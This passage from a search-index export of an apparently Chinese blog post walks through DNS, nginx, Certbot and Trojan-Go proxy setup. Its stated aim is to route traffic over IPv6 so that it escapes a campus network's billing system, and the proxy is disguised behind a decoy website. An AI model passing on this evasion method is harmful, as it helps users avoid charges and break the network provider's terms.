\u57df\u540d","text":"<p>\u9996\u5148\u4f60\u9700\u8981\u62e5\u6709\u4e00\u4e2a\u57df\u540d\uff0c\u8d2d\u4e70\u57df\u540d\u8fd9\u4e2a\u64cd\u4f5c\u5341\u5206\u7b80\u5355\uff0c\u548c\u8d2d\u4e70\u670d\u52a1\u5668\u4e00\u6837\uff0c\u5c31\u50cf\u901b\u6dd8\u5b9d\u90a3\u6837\u4e70\u5c31\u884c\u3002\u4f60\u53ef\u4ee5\u5728 GoDaddy\uff08\u4fd7\u79f0\u72d7\u7239\uff09\u3001NameSilo\u3001\u963f\u91cc\u4e91\u3001\u817e\u8baf\u4e91 \u7b49\u5730\u65b9\u8d2d\u4e70\uff0c\u4e0d\u9700\u8981\u53d6\u592a\u82b1\u91cc\u80e1\u54e8\u7684\u540d\u5b57\u3002\u5f53\u7136\u4e86\u5982\u679c\u4f60\u5df2\u7ecf\u6709\u57df\u540d\u4e86\u53ef\u4ee5\u7ed5\u8fc7\u8fd9\u4e00\u6b65\u3002\u8d2d\u4e70\u57df\u540d\u7684\u5176\u4f59\u6b65\u9aa4\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\uff0c\u7f51\u4e0a\u641c\u641c\u5c31\u6709\u3002</p> <p>\u6211\u4eec\u5047\u8bbe\u4f60\u5728\u8fd9\u4e00\u6b65\u8d2d\u4e70\u4e86\u4e00\u4e2a\u53eb\u505a <code>cauc.sb</code> \u7684\u57df\u540d\u3002</p>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#222-dns","title":"2.2.2 DNS \u914d\u7f6e","text":"<p>\u7136\u540e\u53bb\u914d\u7f6e\u57df\u540d\u7cfb\u7edf\uff08DNS\uff09\u89e3\u6790\u3002\u9996\u5148\u786e\u5b9a\u4f60\u7684\u670d\u52a1\u5668\u7684 IPv6 \u548c IPv4 \u5730\u5740\uff0c\u7136\u540e\u627e\u5230\u4e00\u4e2a DNS \u89e3\u6790\u670d\u52a1\u5546\uff08\u514d\u8d39\u7684\u6709 \u963f\u91cc\u4e91\u3001\u817e\u8baf\u4e91 \u548c Cloudflare \u7b49\uff09\u3002</p> <p>\u8bf7\u505a\u5982\u4e0b\u914d\u7f6e\uff08\u4ee5 Cloudflare \u4e3a\u4f8b\uff09\uff1a</p> <ul> <li> <p>\u5bf9\u4f60\u7684\u57df\u540d\u6dfb\u52a0 <code>AAAA</code> \u8bb0\u5f55\uff0c\u8bb0\u5f55\u503c\uff08\u57df\u540d\uff09\u4e3a\u4f60\u670d\u52a1\u5668\u7684 IPv6 \u5730\u5740\uff0c\u8bb0\u5f55\u5b57\u6bb5\u6211\u4eec\u8f93\u5165 <code>ipv6</code>\u3002</p> <p></p> </li> <li> <p>\u7136\u540e\u518d\u6dfb\u52a0\u4e00\u4e2a <code>A</code> \u8bb0\u5f55\uff0c\u8bb0\u5f55\u503c\uff08\u57df\u540d\uff09\u4e3a\u4f60\u670d\u52a1\u5668\u7684 IPv4 \u5730\u5740\uff0c\u8bb0\u5f55\u5b57\u6bb5\u6211\u4eec\u8f93\u5165 <code>www</code>\u3002\uff08\u56fe\u5c31\u4e0d\u653e\u4e86\uff09</p> </li> </ul> <p>\u8bf7\u6ce8\u610f\uff1a<code>A</code> \u8bb0\u5f55\u662f\u7528\u6765\u6307\u5411\u4e00\u4e2a IPv4 \u5730\u5740\u7684\uff0c\u800c <code>AAAA</code> \u8bb0\u5f55\u662f\u7528\u6765\u6307\u5411\u4e00\u4e2a IPv6 \u5730\u5740\u7684\u3002</p> <p>\u90a3\u4e48 <code>ipv6.cauc.sb</code> \u8fd9\u4e2a\u57df\u540d\u5c31\u4f1a\u6307\u5411\u4f60\u670d\u52a1\u5668\u7684 IPv6 \u5730\u5740\uff0c<code>www.cauc.sb</code> \u8fd9\u4e2a\u57df\u540d\u5c31\u4f1a\u6307\u5411\u4f60\u670d\u52a1\u5668\u7684 IPv4 \u5730\u5740\u3002\u540c\u7406\u4f60\u4e5f\u53ef\u4ee5\u6dfb\u52a0\u5176\u4ed6 <code>A</code> \u8bb0\u5f55\u548c\u5176\u4ed6 <code>AAAA</code> \u8bb0\u5f55\uff0c\u8bb0\u5f55\u5b57\u6bb5\u5176\u5b9e\u662f\u53ef\u4ee5\u968f\u4fbf\u9009\u62e9\u7684\u3002</p> <p>\u4f60\u4e5f\u53ef\u4ee5\u5bf9\u540c\u4e00\u4e2a\u8bb0\u5f55\u503c\uff08\u57df\u540d\uff09\u540c\u65f6\u6dfb\u52a0 <code>A</code> \u8bb0\u5f55\u548c <code>AAAA</code> \u8bb0\u5f55\uff08\u6b64\u65f6\u8be5\u57df\u540d\u6210\u4e3a\u4e86\u4e00\u4e2a \u53cc\u6808 \u57df\u540d\uff09\uff0c\u8bf7\u6ce8\u610f\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u65e0\u6cd5\u786e\u4fdd\u4f60\u7684\u7cfb\u7edf\u8fde\u63a5\u5230\u8be5\u57df\u540d\u6240\u4f18\u5148\u4f7f\u7528\u7684\u65b9\u5f0f\uff0c\u53ef\u80fd\u4f1a\u91c7\u7528 IPv6\uff0c\u4e5f\u6709\u53ef\u80fd\u91c7\u7528 IPv4\uff0c\u5982\u679c\u4f60\u7684\u7cfb\u7edf\u51b3\u5b9a\u4f7f\u7528 IPv4 \u8fde\u63a5\u5230\u8fd9\u4e2a\u57df\u540d\uff0c\u90a3\u4e48\u4f60\u7684\u6d41\u91cf\u5c06\u6b63\u5e38\u8ba1\u5165\u6821\u56ed\u7f51\u8ba1\u8d39\u7cfb\u7edf\u3002</p> <p>\u6ce8\u610f</p> <p>\u4e0a\u8ff0\u4e24\u4e2a\u914d\u7f6e\u53ea\u662f\u4e3a\u4e86\u5411\u7eaf\u65b0\u624b\u8bb2\u89e3\u5982\u4f55\u8fdb\u884c DNS \u914d\u7f6e\uff0c\u4ec5\u5904\u4e8e \u201c\u80fd\u7528\u201d \u7684\u7ea7\u522b\uff0c\u4e0d\u5177\u6709\u751f\u4ea7\u73af\u5883\u7684\u5b9e\u7528\u6027\u3002\u4e8b\u5b9e\u4e0a\uff0c\u6211\u81ea\u5df1\u7684\u914d\u7f6e\u5982\u4e0b\uff1a</p> <ul> <li><code>cauc.sb</code>\uff1a\u53cc\u6808\uff0c\u7ecf\u8fc7 CDN</li> <li><code>www.cauc.sb</code>\uff1a<code>301</code> \u8df3\u8f6c\u5230 <code>cauc.sb</code></li> <li><code>trojan-cdn.cauc.sb</code>\uff1a\u53cc\u6808\uff0c\u7ecf\u8fc7 CDN</li> <li><code>trojan-ipv6.cauc.sb</code>\uff1a\u7eaf IPv6\uff0c\u4e0d\u7ecf\u8fc7 CDN</li> <li><code>trojan-ipv4.cauc.sb</code>\uff1a\u7eaf IPv4\uff0c\u4e0d\u7ecf\u8fc7 CDN</li> </ul> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cCloudflare \u7684 CDN \u662f\u7eaf IPv4\uff0c\u5982\u679c\u7ecf\u8fc7 CDN \u5219\u610f\u5473\u7740\u5c06\u4f1a\u901a\u8fc7 IPv4 \u8fde\u63a5\u5230 CDN\uff0c\u518d\u900f\u8fc7 CDN \u8fde\u63a5\u5230\u4ee3\u7406\u670d\u52a1\u5668\uff08\u5373\u4f7f\u4f60\u5df2\u7ecf\u901a\u8fc7\u8bbe\u7f6e <code>A</code> \u8bb0\u5f55\u548c <code>AAAA</code> \u8bb0\u5f55\u5c06\u8be5\u57df\u540d\u5199\u6210\u4e86\u4e00\u4e2a\u53cc\u6808\u57df\u540d\uff09\u3002\u8fd9\u4f1a\u9020\u6210\u539f\u7406\u4e0a\u7684\u514d\u6d41\u5931\u6548\u3002</p> <p>\u81f3\u4e8e\u5982\u4f55\u5728\u542f\u7528 CDN \u540e\u8fdb\u884c\u4ee3\u7406\uff08\u5373\u4f7f\u8fd9\u4e0d\u662f\u4e3a\u4e86\u514d\u6d41\uff09\uff0c\u8bf7\u53c2\u9605 \u4f7f\u7528 Websocket \u8fdb\u884c CDN \u8f6c\u53d1\u548c\u62b5\u6297\u4e2d\u95f4\u4eba\u653b\u51fb</p>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#223","title":"2.2.3 \u7f51\u7ad9\u5185\u5bb9","text":"<p>\u63a5\u4e0b\u6765\u5f00\u59cb\u653e\u7f6e\u7f51\u7ad9\u5185\u5bb9\uff0c\u8bf7\u968f\u4fbf\u4ece\u7f51\u4e0a\u4e0b\u8f7d\u4e00\u4e2a\u9759\u6001 html \u9875\u9762\uff0c\u7136\u540e\u5c06\u4ed6\u91cd\u547d\u540d\u4e3a <code>index.html</code>\uff0c\u7136\u540e\u653e\u5165\u67d0\u4e2a\u6587\u4ef6\u5939\uff0c\u8bf7\u8bb0\u4f4f\u8fd9\u4e2a\u6587\u4ef6\u5939\u7684\u8def\u5f84\uff0c\u4e4b\u540e\u8fd9\u4e2a\u6587\u4ef6\u5939\u5c06\u4f1a\u6210\u4e3a\u4f60\u7684\u7f51\u7ad9\u6839\u76ee\u5f55\u3002</p> <p>\u5982\u679c\u4f60\u5bf9\u5efa\u7ad9\u611f\u5174\u8da3\uff0c\u6216\u8005\u4e0d\u7518\u5fc3\u8fd9\u4e48\u7b80\u5355\uff0c\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7\u767e\u5ea6\u641c\u7d22\u4e00\u4e9b\u6709\u610f\u601d\u7684\u7f51\u9875\uff08\u662f\u7684\uff0c\u8fd9\u4e2a\u4e1c\u897f\u786e\u5b9e\u53ef\u4ee5\u7528\u6765\u642d\u5efa\u6b63\u513f\u516b\u7ecf\u7684\u7f51\u9875\uff0c\u800c\u4e0d\u53ea\u662f\u8fdb\u884c\u514d\u6d41\uff01\uff09</p>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#224-nginx","title":"2.2.4 nginx \u914d\u7f6e","text":"<p>\u73b0\u5728\u5f00\u59cb\u914d\u7f6e nginx\uff0c\u6839\u636e\u4e0d\u540c\u7684\u7cfb\u7edf\u6709\u4e0d\u540c\u7684\u5b89\u88c5\u65b9\u6cd5\uff0c\u5177\u4f53\u65b9\u6cd5\u81ea\u5df1\u4e0a\u767e\u5ea6\u641c\uff0c\u4f60\u53ea\u9700\u8981\u5728\u610f <code>nginx.conf</code> \u7684\u5185\u5bb9\uff0c\u5e94\u8be5\u8fd9\u4e48\u5199\uff1a</p> <p>\u6ce8\u610f</p> <p>\u8fd9\u53ea\u662f\u4e00\u4e2a <code>nginx.conf</code> \u7684\u793a\u4f8b\u3002\u5982\u679c\u4f60\u8ba4\u4e3a\u4f60\u5df2\u7ecf\u6bd4\u8f83\u719f\u6089\u8fd9\u4e2a\u6587\u4ef6\u7684\u914d\u7f6e\u4e86\uff0c\u6216\u8005\u4f60\u6709\u5176\u4ed6\u7684\u5b9e\u9645\u9700\u6c42\uff0c\u4f60\u4e5f\u53ef\u4ee5\u6839\u636e\u81ea\u5df1\u7684\u9700\u6c42\u8fdb\u884c\u4fee\u6539\u3002</p> <p>\u53e6\u5916\uff0c\u4e0b\u9762\u7684\u5185\u5bb9\u4e0d\u662f <code>nginx.conf</code> \u7684\u6700\u7ec8\u5f62\u6001\uff0c\u540e\u7eed\u8fd8\u9700\u8981\u5728\u8fd9\u91cc\u6dfb\u52a0 https \u7684\u914d\u7f6e\u3002</p> nginx.conf<pre><code>worker_processes  1;\nuser root;\nevents {\nworker_connections  32768;\n}\n\nhttp {\ninclude            mime.types;\ndefault_type       application/octet-stream;\nsendfile           on;\nkeepalive_timeout  65;\naccess_log         off;\n\nserver {\nlisten         80;\nlisten         [::]:80;\nserver_name    localhost;\n\nlocation / {\nroot       /usr/share/nginx/html;\nindex      index.html;\n}\n}\n}\n</code></pre> <p>\u8bf7\u6ce8\u610f\u4ee5\u4e0b\u5b57\u6bb5\uff1a</p> <ul> <li>\u7b2c 2 \u884c - <code>user root</code>\uff1a\u8bf4\u660e\u542f\u52a8 nginx \u7684\u7528\u6237\u4e3a root\uff0c\u5bf9\u4e8e Windows \u7cfb\u7edf\u53ef\u4ee5\u4e0d\u8981\u8fd9\u4e00\u884c</li> <li>\u7b2c 17 \u884c - <code>listen [::]:80</code>\uff1a\u5fc5\u987b\u52a0\u5165\u8fd9\u4e2a\u624d\u4f1a\u76d1\u542c\u6765\u81ea 80 \u7aef\u53e3\u7684 IPv6 \u8bf7\u6c42</li> <li>\u7b2c 21 \u884c - <code>root /usr/share/nginx/html</code>\uff1a\u6307\u5411\u4f60\u81ea\u5df1\u7684\u7f51\u7ad9\u6839\u76ee\u5f55</li> </ul>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#225","title":"2.2.5 \u8bc1\u4e66\u914d\u7f6e","text":"<p>\u63a5\u4e0b\u6765\u6211\u4eec\u53bb Certbot \u83b7\u53d6\u7f51\u7ad9\u8bc1\u4e66\u3002</p> <p>\u9996\u5148\u8fdb\u5165 Certbot \u5b98\u7f51\uff0c\u5728 <code>My HTTP website is running</code> \u8fd9\u91cc\u9009\u62e9 <code>Nginx</code>\uff0c\u7136\u540e\u9009\u62e9\u4f60\u670d\u52a1\u5668\u5bf9\u5e94\u7684\u7cfb\u7edf\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5bf9\u4e8e Windows \u7cfb\u7edf\u4e00\u822c\u662f\u53bb https://dl.eff.org/certbot-beta-installer-win32.exe \u4e0b\u8f7d\u5b89\u88c5\u3002\u800c Linux \u4e00\u822c\u4f7f\u7528\u8f6f\u4ef6\u5305\u7ba1\u7406\u5668\uff08\u4f8b\u5982 apt\u3001snap \u7b49\uff09\u5b89\u88c5\uff0c\u5177\u4f53\u8bf7\u53c2\u8003\u5f53\u9875\u7684\u8bf4\u660e\u3002</p> <p></p> <p>\u73b0\u5728\u6839\u636e\u5f53\u9875\u7684\u8bf4\u660e\uff0c\u4e0b\u8f7d Certbot \u5230\u4f60\u7684\u670d\u52a1\u5668\u3002\u7136\u540e\u8fd0\u884c\u5b83\uff1a</p> <pre><code>certbot certonly\n</code></pre> <p>\u6839\u636e\u63d0\u793a\uff0c\u8f93\u5165 <code>nginx</code>\uff08\u5982\u679c\u4f60\u5df2\u7ecf\u5b8c\u6210\u4e86\u4e0a\u8ff0 nginx \u914d\u7f6e\uff09\u6216\u8005 <code>standalone</code>\uff08\u5982\u679c\u4f60\u8fd8\u6ca1\u6709\u5b8c\u6210 nginx \u7684\u914d\u7f6e\uff0c\u5e76\u4e14 80 \u7aef\u53e3\u6ca1\u6709\u88ab\u5360\u7528\uff09\uff0c\u7136\u540e\u6309\u7167\u63d0\u793a\u5f15\u5bfc\u8f93\u5165\u4f60\u7684\u90ae\u7bb1\u3001\u57df\u540d\u3002</p> <p>\u4f8b\u5982\u4f60\u5728 DNS \u914d\u7f6e\u9636\u6bb5\u6dfb\u52a0\u4e86\u4e00\u4e2a <code>ipv6.cauc.sb</code> \u7684 <code>AAAA</code> \u8bb0\u5f55\uff0c\u8fd8\u6dfb\u52a0\u4e86\u4e00\u4e2a <code>www.cauc.sb</code> \u7684 <code>A</code> \u8bb0\u5f55\uff0c\u8fd8\u6dfb\u52a0\u4e86\u4e00\u4e2a <code>cauc.sb</code> \u7684 <code>A</code> \u8bb0\u5f55\u548c <code>AAAA</code> \u8bb0\u5f55\uff0c\u8fd8\u6dfb\u52a0\u4e86\u4e00\u4e2a <code>wdnmd.cauc.sb</code> \u7684 <code>A</code> \u8bb0\u5f55\u548c <code>AAAA</code> \u8bb0\u5f55\uff0c\u90a3\u4e48\u4f60\u5728\u8f93\u5165\u57df\u540d\u8fd9\u4e00\u6b65\u5e94\u8be5\u8f93\u5165\uff08\u7528\u7a7a\u683c\u5206\u5272\uff09\uff1a</p> <pre><code>www.cauc.sb cauc.sb ipv6.cauc.sb wdnmd.cauc.sb\n</code></pre> <p>\u4e4b\u540e Certbot \u4f1a\u81ea\u52a8\u6d4b\u8bd5\u4f60\u662f\u5426\u62e5\u6709\u57df\u540d\u6240\u6709\u6743\uff0c\u5e76\u4e14\u4f1a\u9881\u53d1\u8bc1\u4e66\uff0c\u6839\u636e\u4e0d\u540c\u7684\u7cfb\u7edf\uff0c\u8bc1\u4e66\u4f1a\u653e\u5728\u4e0d\u540c\u7684\u5730\u65b9\u3002</p> LinuxWindows <ul> <li><code>/etc/letsencrypt/live/cauc.sb/fullchain.pem</code></li> <li><code>/etc/letsencrypt/live/cauc.sb/privkey.pem</code></li> </ul> <ul> <li><code>C:\\Certbot\\live\\cauc.sb\\fullchain.pem</code></li> <li><code>C:\\Certbot\\live\\cauc.sb\\privkey.pem</code></li> </ul> <p>Certbot\u9881\u53d1\u7684\u662f Let's Encrypt \u7684\u8bc1\u4e66\uff0cLet's Encrypt \u662f\u4e00\u4e2a\u7531\u975e\u8425\u5229\u6027\u7ec4\u7ec7\u4e92\u8054\u7f51\u5b89\u5168\u7814\u7a76\u5c0f\u7ec4\uff08ISRG\uff09\u63d0\u4f9b\u7684\u514d\u8d39\u3001\u81ea\u52a8\u5316\u548c\u5f00\u653e\u7684\u8bc1\u4e66\u9881\u53d1\u673a\u6784\uff08CA\uff09\uff0c\u81f4\u529b\u4e8e\u4e3a\u7f51\u7ad9\u63d0\u4f9b\u514d\u8d39\u7684 SSL/TLS \u8bc1\u4e66\u3002Let's Encrypt \u7684 SSL/TLS \u8bc1\u4e66\u9ed8\u8ba4\u53ea\u6709 90 \u5929\u7684\u6709\u6548\u671f\uff0c\u5230\u671f\u4e86\u4e0d\u7528\u614c\uff0c\u53ea\u9700\u8981\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\uff1a</p> <pre><code> certbot renew\n</code></pre> <p>\u5373\u53ef\u81ea\u52a8\u66f4\u65b0\u8bc1\u4e66\u3002\u5bf9\u4e8e Linux \u7cfb\u7edf\u800c\u8a00\uff0cCertbot \u4f1a\u5728\u7cfb\u7edf\u81ea\u52a8\u8bbe\u7f6e\u8ba1\u5212\u4efb\u52a1\u4ee5\u5b9e\u73b0\u81ea\u52a8\u66f4\u65b0\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u6307\u4ee4\u67e5\u770b\uff1a</p> <pre><code>systemctl list-timers\n</code></pre> <p>\u5bf9\u4e8eWindows\u7cfb\u7edf\uff0c\u4f60\u9700\u8981\u81ea\u5df1\u624b\u52a8\u6dfb\u52a0\u8ba1\u5212\u4efb\u52a1\uff0c\u8fd9\u91cc\u4e0d\u505a\u8fc7\u591a\u4ecb\u7ecd\u3002</p> <p>\u5982\u679c\u8fd9\u91cc\u5bf9 Certbot \u7684\u4f7f\u7528\u4ecd\u7136\u5b58\u5728\u95ee\u9898\uff0c\u8bf7\u53c2\u8003\u8fd9\u7bc7\u535a\u5ba2\uff1acertbot \u5e38\u7528\u64cd\u4f5c</p>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#3","title":"\u7b2c 3 \u7ae0 \u670d\u52a1\u7aef\u4e0e\u5ba2\u6237\u7aef\u7684\u914d\u7f6e","text":"","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#31-trojan-go","title":"3.1 Trojan-Go \u7b80\u4ecb","text":"<p>Trojan-Go \u662f\u4f7f\u7528 Go \u5b9e\u73b0\u7684\u5b8c\u6574 Trojan \u4ee3\u7406\uff0c\u517c\u5bb9\u539f\u7248 Trojan \u534f\u8bae\u53ca\u914d\u7f6e\u6587\u4ef6\u683c\u5f0f\u3002\u5b89\u5168\u3001\u9ad8\u6548\u3001\u8f7b\u5de7\u3001\u6613\u7528\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u5c06\u4f1a\u7528\u5b83\u6765\u7ed5\u8fc7\u6821\u56ed\u7f51\u8ba1\u8d39\u7cfb\u7edf\u3002</p> <p>Trojan-Go \u9700\u8981\u4f7f\u7528\u7279\u5b9a\u7684\u5ba2\u6237\u7aef\u624d\u80fd\u8fdb\u884c\u5de5\u4f5c\uff1a</p> <ul> <li>Windows / macOS / Linux\uff1a\u4f7f\u7528 Qv2ray</li> <li>Android\uff1a\u4f7f\u7528 SagerNet</li> <li>iOS/iPad OS\uff1a\u4f7f\u7528 Shadowrocket\uff08\u9664\u56fd\u533a\u4ee5\u5916\u7684 AppStore \u53ef\u8d2d\u4e70\uff0c\u5927\u698220\u5757\u94b1\uff09</li> </ul>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#32-server","title":"3.2 \u914d\u7f6e\u670d\u52a1\u7aef\uff08Server\uff09","text":"<p>\u8282\u9009\u81ea Trojan-Go \u6587\u6863\uff0c\u5982\u679c\u8fd9\u91cc\u770b\u4e0d\u61c2\uff0c\u53ef\u4ee5\u56de\u5230\u539f\u6587\u6863\u53bb\u770b\u3002</p>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#321-trojan-go","title":"3.2.1 \u5b89\u88c5 Trojan-Go","text":"<p>\u6839\u636e\u4f60\u4f7f\u7528\u7684\u7cfb\u7edf\u83b7\u53d6\u670d\u52a1\u7aef\uff1ahttps://github.com/p4gefau1t/trojan-go/releases\u3002</p> <p>\u5728 Trojan-Go \u53ef\u6267\u884c\u6587\u4ef6\u7684\u540c\u6587\u4ef6\u5939\u4e0b\u5efa\u7acb\u4e00\u4e2a <code>config.json</code>\uff1a</p> config.json<pre><code>{\n\"run_type\": \"server\",\n\"local_addr\": \"0.0.0.0\",\n\"local_port\": 443,\n\"remote_addr\": \"127.0.0.1\",\n\"remote_port\": 80,\n\"password\": [\n\"sbDJKnmsl23333\"\n],\n\"ssl\": {\n\"cert\": \"2.2.5 \u91cc fullchain.pem \u7684\u8def\u5f84\",\n\"key\": \"2.2.5 \u91cc privkey.pem \u7684\u8def\u5f84\",\n\"fallback_addr\": \"127.0.0.1\",\n\"fallback_port\": 3824\n}\n}\n</code></pre> <p>\u4f60\u53ef\u4ee5\u81ea\u7531\u4fee\u6539 <code>password</code> \u5b57\u6bb5\uff0c\u800c\u5982\u679c\u4f60\u60f3\u4fee\u6539\u5176\u4ed6\u5185\u5bb9\u7684\u8bdd\uff0c\u8bf7\u6700\u597d\u53c2\u8003\u539f\u6587\u6863\u4fee\u6539\u3002</p> <p>\u6839\u636e <code>Trojan-Go</code> \u914d\u7f6e\u6587\u6863\uff0c\u6211\u4eec\u9700\u8981\u8bbe\u7acb\u4e00\u4e2a <code>fallback</code>\uff0c\u4ee5\u5728\u6211\u4eec\u8bbf\u95ee http://ipv6.cauc.sb:443/ \u65f6\u8fd4\u56de <code>400 Bad Request</code> \u7684\u72b6\u6001\u7801\u3002\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u8981\u8fd9\u4e48\u505a\uff0c\u8bf7\u53c2\u8003 \u6b63\u786e\u914d\u7f6eTrojan-Go\u3002</p>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#322-nginxconf","title":"3.2.2 \u4fee\u6539 <code>nginx.conf</code>","text":"<p>\u56de\u5230 <code>nginx.conf</code>\uff0c\u5728 <code>http</code> \u5757\u4e2d\u6dfb\u52a0\u4e00\u4e2a <code>server</code> \u5757\uff08\u5373\u4e0b\u9762\u7684 26 \u884c\u81f3 36 \u884c\uff09\uff1a</p> <p>\u6700\u540e\u5b8c\u6574\u7684 <code>nginx.conf</code> \u5e94\u8be5\u662f\u8fd9\u6837\uff1a</p> nginx.conf\uff08\u6700\u7ec8\u7248\uff09<pre><code>worker_processes  1;\nuser root;\n\nevents {\nworker_connections  32768;\n}\n\nhttp {\ninclude              mime.types;\ndefault_type         application/octet-stream;\nsendfile             on;\nkeepalive_timeout    65;\naccess_log           off;\n\nserver {\nlisten           80;\nlisten           [::]:80;\nserver_name      localhost;\n\nlocation / {\nroot         /usr/share/nginx/html;\nindex        index.html;\n}\n}\n\nserver {\nlisten               localhost:3824 ssl;\nserver_name          127.0.0.1;\nssl_certificate      2.2.5 \u91cc fullchain.pem \u7684\u8def\u5f84;\nssl_certificate_key  2.2.5 \u91cc privkey.pem \u7684\u8def\u5f84;\nlocation / {\nroot             html;\nindex            index.html index.htm;\n}\n}\n}\n</code></pre> <p>\u8bf7\u6ce8\u610f\u4ee5\u4e0b\u5b57\u6bb5\uff1a</p> <ul> <li>\u7b2c 27 \u884c - <code>listen localhost:3824 ssl</code>\uff1a\u548c\u4f60\u5728 Trojan-Go \u7684 <code>config.json</code> \u91cc\u8bbe\u7f6e\u7684 <code>fallback_port</code> \u4fdd\u6301\u4e00\u81f4</li> <li>\u7b2c 28 \u884c - <code>server_name 127.0.0.1</code>\uff1a\u548c Trojan-Go \u7684 <code>config.json</code> \u91cc\u8bbe\u7f6e\u7684 <code>fallback_addr</code> \u4fdd\u6301\u4e00\u81f4\uff0c\u5343\u4e07\u522b\u5199 <code>0.0.0.0</code> \u54e6\uff0c\u4e0d\u7136\u548c\u88f8\u5954\u4e00\u6837</li> <li>\u7b2c 29\u300130 \u884c - <code>ssl_certificate</code> \u548c <code>ssl_certificate_key</code>\uff1a\u586b 2.2.5 \u8bc1\u4e66\u914d\u7f6e \u4e2d\u83b7\u53d6\u7684\u8def\u5f84\u5c31\u884c</li> </ul> <p>\u4e4b\u540e\u542f\u52a8 Trojan-Go \u670d\u52a1\u7aef\u5e76\u653e\u5165\u540e\u53f0\u5373\u53ef\u3002</p>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#33-client","title":"3.3 \u914d\u7f6e\u5ba2\u6237\u7aef\uff08Client\uff09","text":"<p>\u5c06\u4ee5 Qv2ray\u3001 SagerNet \u548c Shadowrocket \u4e3a\u4f8b\uff0c\u4ecb\u7ecd\u5404\u4e2a\u7cfb\u7edf\u4e0a\u5ba2\u6237\u7aef\u7684\u914d\u7f6e\u3002</p> <p>\u5907\u6ce8</p> <p>\u8bf7\u6ce8\u610f\uff0cQv2ray \u540c\u6837\u9002\u7528\u4e8e macOS\uff0c\u4f46\u7b14\u8005\u5e76\u6ca1\u6709 macOS \u73af\u5883\u4ee5\u4f9b\u6d4b\u8bd5\uff0c\u6545\u6ca1\u6709\u64b0\u5199 macOS \u4e0b\u7684\u4f7f\u7528\u65b9\u6cd5\u3002</p> <p>\u5982\u679c\u4f60\u6709 macOS\uff0c\u5e76\u4e14\u60f3\u8981\u5b8c\u5584\u8fd9\u7bc7\u535a\u5ba2\uff0c\u4f60\u53ef\u4ee5\u5728\u8bc4\u8bba\u533a\u8bc4\u8bba\u6216\u8005\u53d1 Pull Request\u3002</p>","tags":["ipv6","nginx","proxy","certbot"]},{"location":"blog/2022/220602-ipv6-bypass-billing-system/#331-qv2ray","title":"3.3.1 Qv2ray","text":"<p>\u4ee5 Windows 10 \u4e3a\u4f8b\uff0c\u9996\u5148\u83b7\u53d6\u5bf9\u5e94\u7cfb\u7edf\u7684\u5fc5\u8981\u7ec4\u4ef6\uff1a</p> <ul> <li>Qv2ray\uff08\u538b\u7f29\u5305 <code>Qv2ray-v2.7.0-Windows.7z</code>\uff09\uff1a2.7.0-pre2</li> <li>V2Ray \u6838\u5fc3\uff08\u538b\u7f29\u5305 <code>v2ray-windows-64.zip</code>\uff09\uff1a4.37.3</li> <li>Trojan-Go \u6838\u5fc3\uff08\u538b\u7f29\u5305 <code>trojan-go-windows-amd64.zip</code>\uff09\uff1a0.8.3</li> <li>Qv2ray \u7684 Trojan-Go \u63d2\u4ef6\uff08\u52a8\u6001\u94fe\u63a5\u5e93 <code>QvPlugin-TrojanGo.v3.0.0-pre3.Windows-x64.dll</code>\uff09\uff1a3.0.0-pre3</li> </ul> <p>\u6ce8\u610f</p> <p>\u867d\u7136\u6309\u7167\u60ef\u4f8b\uff0c\u5e94\u8be5\u5b89\u88c5\u6700\u65b0\u7248\u672c\u7684\u5404\u4e2a\u7ec4\u4ef6\uff0c\u4f46\u662f\u76ee\u524d\u5df2\u7ecf\u786e\u8ba4\u65b0\u7248\u672c\u4e4b\u95f4\u4f1a\u5b58\u5728\u517c\u5bb9\u6027\u95ee\u9898\uff0c\u6240\u4ee5\u6211\u7ed9\u51fa\u4e86\u4e00\u4e2a\u80fd\u7528\uff08\u81f3\u5c11\u5728 2021 \u5e74 4 \u6708\u80fd\u7528\uff09\u7684\u7248\u672c\u3002</p> <p>\u5c06 <code>Qv2ray</code>\u3001<code>V2Ray \u6838\u5fc3</code>\u3001<code>Trojan-Go \u6838\u5fc3</code> \u5206\u522b\u5b89\u88c5\u6216\u89e3\u538b\u5230\u4e09\u4e2a\u6587\u4ef6\u5939\u3002</p> <p>\u6253\u5f00 Qv2ray\uff0c\u8fdb\u5165 <code>\u9996\u9009\u9879</code>\uff0c\u8fdb\u5165 <code>\u5185\u6838\u8bbe\u7f6e</code>\uff0c\u5c06 <code>V2Ray\u8d44\u6e90\u76ee\u5f55</code> \u8bbe\u7f6e\u4e3a <code>V2Ray \u6838\u5fc3</code> \u89e3\u538b\u5230\u7684\u6587\u4ef6\u5939\u3002\u7136\u540e\u5c06 <code>V2Ray\u6838\u5fc3\u53ef\u6267\u884c\u6587\u4ef6\u8def\u5f84</code> \u8bbe\u7f6e\u4e3a\u8fd9\u4e2a\u6587\u4ef6\u5939\u4e0b\u7684 <code>v2ray.exe</code>\uff0c\u53ef\u4ee5\u70b9\u51fb <code>\u68c0\u67e5V2Ray\u6838\u5fc3\u8bbe\u7f6e</code> 